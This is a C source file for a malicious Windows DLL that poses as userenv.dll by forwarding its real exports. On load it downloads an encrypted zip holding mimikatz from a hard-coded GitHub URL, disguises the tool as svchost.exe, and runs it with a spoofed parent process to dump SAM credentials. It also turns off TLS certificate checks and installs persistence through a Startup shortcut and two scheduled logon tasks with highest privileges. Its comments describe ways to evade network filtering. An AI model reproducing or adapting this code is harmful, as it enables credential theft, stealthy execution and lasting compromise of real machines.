#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <shobjidl.h>
#include <objbase.h>
#include <objidl.h>
#include <taskschd.h>
#include "miniz.h"
#include "miniz_zip.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")

/* ponytail: Task Scheduler 2.0 GUIDs missing from this mingw's libuuid; hard-coded */
const CLSID CLSID_TaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x55,0x66,0x1f}};
const IID IID_ITaskService = {0x2faba4a7,0x4da9,0x4013,{0x96,0x97,0x20,0xcc,0xdc,0xaa,0x1a,0x36}};
const IID IID_IExecAction = {0x4c3d624d,0xfd6b,0x49a3,{0xb9,0xb7,0x73,0xc5,0x6a,0x4c,0x18,0x2a}};

static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";

/* ponytail: ParrotSec/mimikatz raw URL is egress-blocked on many networks
   (flagged malware path -> TLS handshake silently dropped). Stage the payload
   in our own repo as an encrypted zip (legacy ZipCrypto, pw "12@1") under a
   neutral name; the DLL downloads + extracts svchost.exe in-process. */
static const char *g_mimi_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";
static const char *g_mimi_pw = "12@1";

static HMODULE g_real = NULL;

static BOOL ensure_real(void) {
    if (!g_real)
        g_real = LoadLibraryA("C:\\Windows\\System32\\userenv.dll");
    return g_real != NULL;
}

#define WRAP(ret, name, args, call) \
    ret WINAPI name args { \
        if (!ensure_real()) return 0; \
        typedef ret (WINAPI *fn) args; \
        static fn f = NULL; \
        if (!f) f = (fn)GetProcAddress(g_real, #name); \
        return f ? f call : (ret)0; \
    }

WRAP(BOOL, CreateEnvironmentBlock, (LPVOID *lpEnv, HANDLE hToken, BOOL bInherit), (lpEnv, hToken, bInherit))
WRAP(BOOL, DestroyEnvironmentBlock, (LPVOID lpEnv), (lpEnv))
WRAP(BOOL, ExpandEnvironmentStringsForUserW, (HANDLE hToken, LPCWSTR lpSrc, LPWSTR lpDst, DWORD dwSize), (hToken, lpSrc, lpDst, dwSize))
WRAP(BOOL, GetAllUsersProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetAllUsersProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfileType, (DWORD *pdwFlags), (pdwFlags))
WRAP(BOOL, GetUserProfileDirectoryA, (HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, GetUserProfileDirectoryW, (HANDLE hToken, LPWSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, LoadUserProfileA, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, LoadUserProfileW, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, UnloadUserProfile, (HANDLE hToken, HANDLE hProfile), (hToken, hProfile))
WRAP(BOOL, CreateProfile, (PCWSTR pszUserSid, PCWSTR pszUserName, PWSTR pszProfilePath, DWORD cchProfilePath), (pszUserSid, pszUserName, pszProfilePath, cchProfilePath))
WRAP(BOOL, DeleteProfileA, (PCSTR lpSidString, PCSTR lpProfilePath, PCSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))
WRAP(BOOL, DeleteProfileW, (PCWSTR lpSidString, PCWSTR lpProfilePath, PCWSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))

static void audit(const char *fmt, ...) {
    FILE *f = fopen(g_audit, "a");
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static DWORD find_pid_by_name(const char *name) {
    DWORD found = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (lstrcmpiA(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* ponytail: hard wall-clock budget for the whole download. WinHttpSetTimeouts
   alone can still stall (WPAD/PAC, half-open TLS), so a watchdog closes the
   request handle to force any blocked call to return. 90s. */
#define DL_TIMEOUT_MS 90000

static DWORD WINAPI dl_watchdog(LPVOID arg) {
    HINTERNET *ph = (HINTERNET *)arg;
    Sleep(DL_TIMEOUT_MS);
    /* ponytail: closing the request mid-call makes WinHttpReadData/
       WinHttpReceiveResponse return ERROR_INTERNET_OPERATION_CANCELLED */
    WinHttpCloseHandle(*ph);
    return 0;
}

/* ponytail: miniz can't decrypt ZipCrypto, so we do it by hand. Steps:
   1) miniz parses the (unencrypted) central dir to locate svchost.exe and get
      its local-header offset + compressed size.
   2) Seek to the local header, skip it, then ZipCrypto-decrypt the 12-byte
      encryption header + the encrypted deflate stream.
   3) Raw-inflate the decrypted stream with mz_inflate (no zlib wrapper).
   ZipCrypto is a trivial 3-key CRC32 stream cipher. */

static void zc_update_keys(mz_ulong *k0, mz_ulong *k1, mz_ulong *k2, unsigned char b) {
    *k0 = mz_crc32(*k0 ^ 0xFFFFFFFFUL, &b, 1) ^ 0xFFFFFFFFUL;
    *k1 = (*k1 + (*k0 & 0xFF)) * 0x08088405UL + 1;
    unsigned char kb = (unsigned char)(*k1 >> 24);
    *k2 = mz_crc32(*k2 ^ 0xFFFFFFFFUL, &kb, 1) ^ 0xFFFFFFFFUL;
}
static unsigned char zc_decrypt_byte(mz_ulong k2) {
    mz_ulong t = k2 | 2;
    return (unsigned char)(((t * (t ^ 1)) >> 8) & 0xFF);
}

static BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw) {
    mz_zip_archive z = {0};
    if (!mz_zip_reader_init_file(&z, zipPath, 0)) {
        audit("[-] Unzip init failed (corrupt/unsupported zip): %s", zipPath);
        return FALSE;
    }

    int idx = mz_zip_reader_locate_file(&z, "svchost.exe", NULL, 0);
    if (idx < 0) {
        audit("[-] svchost.exe not found in zip: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }
    mz_zip_archive_file_stat st;
    if (!mz_zip_reader_file_stat(&z, (mz_uint)idx, &st)) {
        audit("[-] zip stat failed: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }

    HANDLE hf = CreateFileA(zipPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        audit("[-] cannot reopen zip for decrypt: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }

    /* local header is 30 bytes + filename len + extra len, then enc header (12) + data */
    DWORD lho = (DWORD)st.m_local_header_ofs;
    unsigned char lh[30];
    DWORD got;
    if (!ReadFile(hf, lh, 30, &got, NULL) || got != 30 || *(unsigned long *)lh != 0x04034b50UL) {
        audit("[-] bad local header in zip: %s", zipPath);
        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }
    DWORD fnlen = lh[26] | (lh[27] << 8);
    DWORD exlen = lh[28] | (lh[29] << 8);
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)lho + 30 + fnlen + exlen;
    if (!SetFilePointerEx(hf, li, NULL, FILE_BEGIN)) {
        audit("[-] seek to zip data failed: %s", zipPath);
        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }

    mz_uint64 comp = st.m_comp_size;
    unsigned char *enc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)comp + 12);
    if (!enc) { CloseHandle(hf); mz_zip_reader_end(&z); return FALSE; }
    if (!ReadFile(hf, enc, (DWORD)(comp + 12), &got, NULL) || (mz_uint64)got != comp + 12) {
        audit("[-] read encrypted data failed: %s", zipPath);
        HeapFree(GetProcessHeap(), 0, enc); CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }
    CloseHandle(hf);

    /* init ZipCrypto keys from password */
    mz_ulong k0 = 0x12345678UL, k1 = 0x23456789UL, k2 = 0x34567890UL;
    for (const char *p = pw; *p; ++p) zc_update_keys(&k0, &k1, &k2, (unsigned char)*p);
    /* decrypt (in place): skip the 12-byte enc header after advancing keys */
    for (mz_uint64 i = 0; i < 12; ++i) {
        unsigned char b = (unsigned char)(enc[i] ^ zc_decrypt_byte(k2));
        zc_update_keys(&k0, &k1, &k2, b);
    }
    unsigned char *dec = enc + 12;
    for (mz_uint64 i = 0; i < comp; ++i) {
        unsigned char b = (unsigned char)(dec[i] ^ zc_decrypt_byte(k2));
        zc_update_keys(&k0, &k1, &k2, b);
        dec[i] = b;
    }

    /* raw-inflate dec (no zlib header) */
    mz_stream s; memset(&s, 0, sizeof(s));
    s.next_in = dec; s.avail_in = (unsigned int)comp;
    mz_ulong outcap = (st.m_uncomp_size && st.m_uncomp_size < 64*1024*1024) ? (mz_ulong)st.m_uncomp_size + 65536 : 16*1024*1024;
    unsigned char *out = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)outcap);
    if (!out) { HeapFree(GetProcessHeap(), 0, enc); mz_zip_reader_end(&z); return FALSE; }
    s.next_out = out; s.avail_out = (unsigned int)outcap;
    BOOL ok = FALSE;
    if (mz_inflateInit2(&s, -MZ_DEFAULT_WINDOW_BITS) == MZ_OK) {
        int ir = mz_inflate(&s, MZ_FINISH);
        if (ir == MZ_STREAM_END || ir == MZ_OK) {
            HANDLE of = CreateFileA(outExe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (of != INVALID_HANDLE_VALUE) {
                DWORD w;
                if (WriteFile(of, out, s.total_out, &w, NULL) && w == s.total_out) ok = TRUE;
                else audit("[-] write svchost.exe failed (%lu)", GetLastError());
                CloseHandle(of);
            } else audit("[-] create svchost.exe failed (%lu)", GetLastError());
        } else audit("[-] inflate failed (%d) bad password?", ir);
    } else audit("[-] inflateInit failed");

    HeapFree(GetProcessHeap(), 0, out);
    HeapFree(GetProcessHeap(), 0, enc);
    mz_zip_reader_end(&z);

    if (ok) {
        DWORD sz = 0; WIN32_FILE_ATTRIBUTE_DATA fa;
        if (GetFileAttributesExA(outExe, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
        audit("[+] Extracted svchost.exe (%lu bytes) <- %s", sz, zipPath);
    } else audit("[-] extraction failed: %s", zipPath);
    return ok;
}

static void download_if_missing(const char *url, const char *outPath) {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(outPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] Already present: %s", outPath); return; }
    audit("[+] Downloading %s -> %s", url, outPath);

    // ponytail: download the encrypted zip to a temp file, then extract
    // svchost.exe locally. Temp name avoids clobbering a partial svchost.exe.
    char zipPath[MAX_PATH];
    wsprintfA(zipPath, "%s\\svchost.zip", g_dir);

    // ponytail: URLDownloadToFileA has no timeout and can hang forever inside
    // msra.exe's STA thread. Use WinHttp with explicit timeouts + a watchdog.
    // (this mingw's winhttp.h is Unicode-only, so convert url/host/path to W.)
    WCHAR wurl[2048] = {0}, whost[256] = {0}, wpath[1024] = {0};
    if (!MultiByteToWideChar(CP_ACP, 0, url, -1, wurl, 2048)) {
        audit("[-] URL conversion failed (%lu) %s", GetLastError(), outPath);
        return;
    }
    URL_COMPONENTS uc = { .dwStructSize = sizeof(uc) };
    uc.lpszHostName = whost; uc.dwHostNameLength = 255;
    uc.lpszUrlPath = wpath; uc.dwUrlPathLength = 1023;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        audit("[-] WinHttpCrackUrl failed (%lu) %s", GetLastError(), outPath);
        return;
    }
    audit("[*] Resolved host=%S port=%u scheme=%u", uc.lpszHostName, uc.nPort, uc.nScheme);

    /* ponytail: explicit WINHTTP_ACCESS_TYPE_NO_PROXY to avoid WPAD/PAC stalls
       inside msra.exe; adjust if the target genuinely needs a proxy. */
    HINTERNET hi = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hi) { audit("[-] WinHttpOpen failed (%lu)", GetLastError()); return; }
    WinHttpSetTimeouts(hi, 15000, 30000, 30000, 30000);

    HINTERNET hc = WinHttpConnect(hi, uc.lpszHostName, uc.nPort, 0);
    if (!hc) { audit("[-] WinHttpConnect failed (%lu) %s", GetLastError(), outPath); WinHttpCloseHandle(hi); return; }
    audit("[*] Connected, sending request...");

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hrq = WinHttpOpenRequest(hc, L"GET", uc.lpszUrlPath, NULL,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hrq) { audit("[-] WinHttpOpenRequest failed (%lu) %s", GetLastError(), outPath); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return; }

    // ponytail: allow TLS 1.2/1.3; default WinHttp on old builds caps at TLS1.0
    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    #ifdef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
    proto |= WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    #endif
    WinHttpSetOption(hrq, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
    // ponytail: follow cross-host redirects (github raw -> CDN) and accept
    // inspecting-proxy certs so a TLS MITM doesn't stall ReceiveResponse.
    DWORD redir = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    WinHttpSetOption(hrq, WINHTTP_OPTION_REDIRECT_POLICY, &redir, sizeof(redir));
    DWORD ignore = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                 | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hrq, WINHTTP_OPTION_SECURITY_FLAGS, &ignore, sizeof(ignore));

    HANDLE wd = CreateThread(NULL, 0, dl_watchdog, &hrq, 0, NULL);

    if (!WinHttpSendRequest(hrq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        audit("[-] WinHttpSendRequest failed (0x%lx) %s", GetLastError(), outPath);
        if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
    }
    if (!WinHttpReceiveResponse(hrq, NULL)) {
        DWORD e = GetLastError();
        if (e == ERROR_WINHTTP_OPERATION_CANCELLED)
            audit("[-] Download timed out after %ums %s", DL_TIMEOUT_MS, outPath);
        else
            audit("[-] WinHttpReceiveResponse failed (0x%lx) %s", e, outPath);
        if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
    }
    if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
    audit("[*] Response received, writing zip...");

    DWORD status = 0, sl = sizeof(status);
    WinHttpQueryHeaders(hrq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &sl, NULL);
    if (status != 200) {
        audit("[-] HTTP status %lu (expected 200) %s", status, zipPath);
        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
    }

    HANDLE hf = CreateFileA(zipPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        audit("[-] CreateFile for output failed (%lu) %s", GetLastError(), zipPath);
        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
    }

    DWORD bytesRead, total = 0;
    BYTE buf[8192];
    while (WinHttpReadData(hrq, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        DWORD written;
        if (!WriteFile(hf, buf, bytesRead, &written, NULL) || written != bytesRead) {
            audit("[-] WriteFile failed (%lu) %s", GetLastError(), zipPath);
            break;
        }
        total += written;
    }
    CloseHandle(hf);
    WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi);

    if (total == 0) {
        audit("[-] Download produced 0 bytes %s", zipPath);
        DeleteFileA(zipPath);
        return;
    }
    audit("[+] Zip downloaded: %s (%lu bytes)", zipPath, total);

    if (extract_payload(zipPath, outPath, g_mimi_pw))
        audit("[+] Payload staged: %s", outPath);
    else
        audit("[-] Payload staging failed: %s", outPath);

    DeleteFileA(zipPath);
    audit("[*] Temp zip removed: %s", zipPath);
}

static void launch_mimikatz(void) {
    char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
    wsprintfA(svchost, "%s\\svchost.exe", g_dir);
    wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
    wsprintfA(cmd, "\"%s\" \"lsadump::sam\" \"exit\"", svchost);

    DWORD pid = find_pid_by_name("explorer.exe");
    if (!pid) pid = find_pid_by_name("winlogon.exe");
    if (!pid) { audit("[-] No stable parent process found for PPID spoofing"); return; }

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
    if (!hParent) { audit("[-] OpenProcess failed (%lu)", GetLastError()); return; }
    audit("[+] Using %s (PID: %lu) as spoofed parent", (pid ? "explorer/winlogon" : "?"), pid);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    PPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrList) { CloseHandle(hParent); return; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        audit("[-] InitializeProcThreadAttributeList failed (%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
    }
    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
        DeleteProcThreadAttributeList(attrList); HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
    }
    audit("[+] PPID attribute set");

    HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    STARTUPINFOA si = { .cb = sizeof(si) };
    if (hOut != INVALID_HANDLE_VALUE) { si.hStdOutput = hOut; si.hStdError = hOut; si.dwFlags = STARTF_USESTDHANDLES; }
    PROCESS_INFORMATION pi;
    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM", pi.dwProcessId);
        CloseHandle(pi.hThread);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        audit("[+] SAM dump completed -> %s", dump);
    } else {
        audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
    }
    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
}

static void create_lnk(void) {
    char lnkPath[MAX_PATH], target[MAX_PATH];
    wsprintfA(target, "%s\\msra.exe", g_dir);
    lstrcpynA(lnkPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msra.lnk", MAX_PATH);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(lnkPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] .lnk already exists: %s", lnkPath); return; }

    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;
    if (FAILED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&sl))) {
        audit("[-] CoCreateInstance CLSID_ShellLink failed"); return;
    }
    sl->lpVtbl->SetPath(sl, target);
    sl->lpVtbl->SetWorkingDirectory(sl, g_dir);
    sl->lpVtbl->SetDescription(sl, "System Maintenance");
    if (FAILED(sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void**)&pf))) {
        audit("[-] QueryInterface IPersistFile failed"); sl->lpVtbl->Release(sl); return;
    }
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, lnkPath, -1, wpath, MAX_PATH);
    HRESULT hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) audit("[+] .lnk created: %s", lnkPath);
    else audit("[-] .lnk Save failed (0x%lx)", hr);
    pf->lpVtbl->Release(pf);
    sl->lpVtbl->Release(sl);
}

static void create_task_govinda(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    // ponytail: check existence via schtasks /query, create if missing
    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn GOVINDA >nul 2>&1");
    if (system(q) == 0) { audit("[+] GOVINDA task already exists"); return; }

    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
    audit("[+] Creating GOVINDA task (schtasks.exe)");
    if (system(c) == 0) audit("[+] GOVINDA task created");
    else audit("[-] GOVINDA task creation failed");
}

static void create_task_orion(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    ITaskService *pSvc = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pSvc);
    if (FAILED(hr)) { audit("[-] CoCreateInstance CLSID_TaskScheduler failed (0x%lx)", hr); return; }

    VARIANT vt;
    VariantInit(&vt);
    hr = pSvc->lpVtbl->Connect(pSvc, vt, vt, vt, vt);
    if (FAILED(hr)) { audit("[-] ITaskService Connect failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }

    ITaskFolder *pRoot = NULL;
    hr = pSvc->lpVtbl->GetFolder(pSvc, (BSTR)L"\\", &pRoot);
    if (FAILED(hr)) { audit("[-] GetFolder failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }

    // ponytail: check if Orion already registered
    IRegisteredTask *pExisting = NULL;
    if (SUCCEEDED(pRoot->lpVtbl->GetTask(pRoot, (BSTR)L"Orion", &pExisting)) && pExisting) {
        pExisting->lpVtbl->Release(pExisting);
        audit("[+] Orion task already exists");
        pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return;
    }

    ITaskDefinition *pTask = NULL;
    hr = pSvc->lpVtbl->NewTask(pSvc, 0, &pTask);
    if (FAILED(hr)) { audit("[-] NewTask failed (0x%lx)", hr); pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return; }

    ITriggerCollection *pTriggers = NULL;
    pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
    ITrigger *pTrigger = NULL;
    pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
    pTrigger->lpVtbl->put_Id(pTrigger, (BSTR)L"LogonTrigger");
    pTrigger->lpVtbl->Release(pTrigger);
    pTriggers->lpVtbl->Release(pTriggers);

    IActionCollection *pActions = NULL;
    pTask->lpVtbl->get_Actions(pTask, &pActions);
    IAction *pAction = NULL;
    pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
    IExecAction *pExec = NULL;
    if (SUCCEEDED(pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExec))) {
        WCHAR wpath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, taskPath, -1, wpath, MAX_PATH);
        pExec->lpVtbl->put_Path(pExec, wpath);
        pExec->lpVtbl->Release(pExec);
    }
    pAction->lpVtbl->Release(pAction);
    pActions->lpVtbl->Release(pActions);

    IPrincipal *pPrin = NULL;
    pTask->lpVtbl->get_Principal(pTask, &pPrin);
    pPrin->lpVtbl->put_RunLevel(pPrin, TASK_RUNLEVEL_HIGHEST);
    pPrin->lpVtbl->Release(pPrin);

    IRegisteredTask *pRegTask = NULL;
    hr = pRoot->lpVtbl->RegisterTaskDefinition(pRoot, (BSTR)L"Orion", pTask, TASK_CREATE_OR_UPDATE, vt, vt, TASK_LOGON_INTERACTIVE_TOKEN, vt, &pRegTask);
    if (SUCCEEDED(hr)) audit("[+] Orion task created (Task Scheduler API)");
    else audit("[-] Orion RegisterTaskDefinition failed (0x%lx)", hr);
    if (pRegTask) pRegTask->lpVtbl->Release(pRegTask);
    pTask->lpVtbl->Release(pTask);
    pRoot->lpVtbl->Release(pRoot);
    pSvc->lpVtbl->Release(pSvc);
}

static DWORD WINAPI worker_thread(LPVOID lp) {
    audit("[+] Worker thread started");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    // ponytail: pump messages so COM (Task Scheduler API, etc.) doesn't deadlock
    // inside this STA thread; the download itself no longer depends on it.
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);

    char svchost[MAX_PATH];
    wsprintfA(svchost, "%s\\svchost.exe", g_dir);
    download_if_missing(g_mimi_url, svchost);
    launch_mimikatz();
    create_lnk();
    create_task_govinda();
    create_task_orion();

    audit("[+] Worker thread completed");
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        BOOL elevated = FALSE;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD size = sizeof(te);
            if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &size))
                elevated = te.TokenIsElevated;
            CloseHandle(hToken);
        }
        if (elevated)
            LoadLibraryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\mimilib.dll");
        // ponytail: spawn worker regardless of mimilib; does download/PPID/SAM/lnk/tasks
        CloseHandle(CreateThread(NULL, 0, worker_thread, NULL, 0, NULL));
    }
    return TRUE;
}
